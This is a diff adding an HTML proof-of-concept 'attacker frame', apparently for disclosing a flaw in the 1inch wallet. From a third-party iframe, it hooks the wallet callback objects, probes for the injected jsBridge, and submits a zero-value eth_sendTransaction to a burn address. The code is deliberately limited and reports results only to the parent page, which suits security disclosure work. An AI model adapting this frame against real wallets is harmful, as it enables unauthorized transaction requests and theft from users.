@@ -1,0 +1,54 @@
+<!doctype html><meta charset=utf-8><title>attacker frame</title>
+<style>body{font:14px/1.45 system-ui;padding:10px;margin:0}
+h4{color:#b00;margin:2px 0}pre{white-space:pre-wrap;word-break:break-all;background:#ffe9e9;padding:8px;margin:6px 0}
+b{font-size:15px}</style>
+<h4>THIRD-PARTY FRAME — different origin, not named on the wallet dialog</h4>
+<div>frame <b>location.origin</b> = <b id=org>?</b></div>
+<pre id=o>idle</pre>
+<script>
+var log=function(m){document.getElementById('o').textContent += "\n"+m;};
+document.getElementById('org').textContent = location.origin;
+
+// --- self-report: on-screen + postMessage to the parent. No external collector by design. ---
+function report(ev, extra){
+  var msg = {poc:"1inch-inbound-iframe", ctx:"IFRAME", event:ev,
+             origin:location.origin, ts:new Date().toISOString()};
+  if (extra) for (var k in extra) msg[k]=extra[k];
+  try { parent.postMessage(msg, "*"); } catch(e) {}
+}
+
+// --- register the response hook, even though delivery via this path is NOT claimed ---
+function cap(id, result){
+  document.getElementById('o').textContent =
+    "*** FRAME RECEIVED A CALLBACK ***\norigin: "+location.origin+"\nid: "+id+"\nresult: "+result;
+  report("callback", {id:String(id), result:String(result)});
+}
+window.OneInchIOSWallet    = { init:function(){}, executeCallback: cap };
+window.OneInchSolanaWallet = { init:function(){}, executeCallback: cap };
+
+var probe = { ownJsBridge: (typeof window.jsBridge !== 'undefined'),
+              ownEthereum: (typeof window.ethereum !== 'undefined') };
+try { probe.parentBridge = (typeof window.parent.jsBridge); }
+catch(e){ probe.parentBridge = "blocked:"+e.name; }
+log("probe: " + JSON.stringify(probe));
+report("loaded", probe);
+
+// eth_sendTransaction, value 0x0, to a burn address.
+// Submitted ONLY so the wallet's confirmation dialog can be observed. DO NOT CONFIRM IT.
+setTimeout(function(){
+  var req = { method:"eth_sendTransaction",
+    params:[{ from:"0x350b28657C79b23efa512B2E46340d3CFb73ce8C",
+              to:"0x000000000000000000000000000000000000dEaD",
+              value:"0x0", data:"0x" }],
+    id: 777003, jsonrpc:"2.0" };
+  var sent = "NONE";
+  try {
+    if (window.jsBridge && window.jsBridge.postEvmMessage) {
+      window.jsBridge.postEvmMessage(JSON.stringify(req));
+      sent = "sent via this frame's OWN window.jsBridge";
+    } else { sent = "no jsBridge in this frame"; }
+  } catch(e) { sent = "throw: " + e.name; }
+  log(sent);
+  report("sent", {method:"eth_sendTransaction", path:sent});
+}, 700);
+</script>
